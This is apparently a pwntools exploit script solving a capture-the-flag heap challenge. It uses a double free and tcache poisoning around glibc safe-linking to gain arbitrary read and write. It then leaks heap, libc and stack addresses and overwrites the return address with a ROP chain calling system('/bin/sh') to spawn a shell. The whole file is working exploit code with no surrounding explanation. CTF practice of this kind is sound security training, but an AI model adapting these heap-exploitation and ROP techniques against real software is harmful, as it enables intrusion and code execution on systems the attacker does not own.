#!/usr/bin/python3
from pwn import *

elf = ELF("../public/chall")
libc = ELF("../public/libc.so.6")
context.binary = elf

HOST = "127.0.0.1"
PORT = 9999

gs = """
continue
"""


def start():
    if args.DEBUG:
        context.log_level = "debug"
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


def add(idx, name_size, name, price=None):
    if not price:
        price = idx

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(name_size).encode())
    io.sendafter(b": ", str(price).encode())
    io.sendafter(b": ", name)

    return idx


def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())


def edit(idx, name, price=None):
    if not price:
        price = idx

    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b": ", str(price).encode())
    io.sendafter(b": ", name)


def view(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"price: ")
    price = io.recvline().strip()
    io.recvuntil(b"name: ")
    name = io.recvline().strip()

    return name, price


def encrypt_safe_linking(addr, heap):
    return addr ^ (heap >> 12)


# from https://github.com/shellphish/how2heap/blob/master/glibc_2.36/decrypt_safe_linking.c
def decrypt_safe_linking(cipher):
    key, plain = 0, 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return plain


def main():
    global io
    io = start()

    # STAGE 1: LEAK HEAP
    add(0, 0x28, b"leak_heap")
    add(1, 0x28, b"leak_heap")
    delete(0)
    delete(1)
    add(0, 0x28, b"\x01")
    leak = view(0)
    heap = decrypt_safe_linking(u64(leak[0].ljust(8, b"\x00"))) >> 12 << 12
    log.info(f"heap: {hex(heap)}")

    # STAGE 2: LEAK LIBC
    overlap = add(2, 0x78, b"otw_overlap".ljust(24, b"\x00") + p64(0x21))
    add(6, 0x78, b"will_delete_this_twice_so_we_get_an_editable_freed_chunk")
    delete(6)  # 1st delete
    add(3, 0x78, b"editable_freed_chunk")  # item @ index 3 == item @ index 6
    unsorted = add(4, 0x78, b"otw_unsorted")
    for _ in range(8):
        add(5, 0x78, b"filler_for_larbin")

    delete(0)  # padding chunk for successful tcache poisoning
    delete(6)  # 2nd delete, we got an editable freed chunk
    edit(
        3, b"tcache_poisoning", encrypt_safe_linking(heap + 0x360, heap)
    )  # write after free
    add(5, 0x28, b"brrr")
    victim = add(5, 0x28, b"victim_chunk")

    edit(
        overlap,
        b"sudah_overlap".ljust(24, b"\x00") + p64(0x21) +
        p64(0) + p64(heap + 0x478),
    )  # point name ptr to unsorted's size
    edit(victim, p64(0x501))
    delete(unsorted)  # get unsorted chunk

    edit(
        overlap,
        b"sudah_overlap".ljust(24, b"\x00") + p64(0x21) +
        p64(0) + p64(heap + 0x480),
    )  # point name ptr to unsorted's fd
    libc.address = u64(view(victim)[0].ljust(8, b"\x00")) - 0x1D2CC0
    log.info(f"libc: {hex(libc.address)}")

    # STAGE 3: LEAK STACK
    edit(
        overlap,
        b"sudah_overlap".ljust(24, b"\x00")
        + p64(0x21)
        + p64(0)
        + p64(libc.sym.environ),
    )  # point name ptr to environ
    ret_addr = u64(view(victim)[0].ljust(8, b"\x00")) - 0x140
    log.info(f"ret addr: {hex(ret_addr)}")

    # STAGE 4: PROFIT
    edit(
        overlap,
        b"sudah_overlap".ljust(24, b"\x00") + p64(0x21) +
        p64(0) + p64(ret_addr),
    )  # point name ptr to return address

    pop_rdi = libc.address + 0x27725
    bin_sh = next(libc.search(b"/bin/sh"))
    rop_chain = flat(pop_rdi + 1, pop_rdi, bin_sh, libc.sym.system)
    edit(victim, rop_chain)

    io.interactive()


if __name__ == "__main__":
    main()
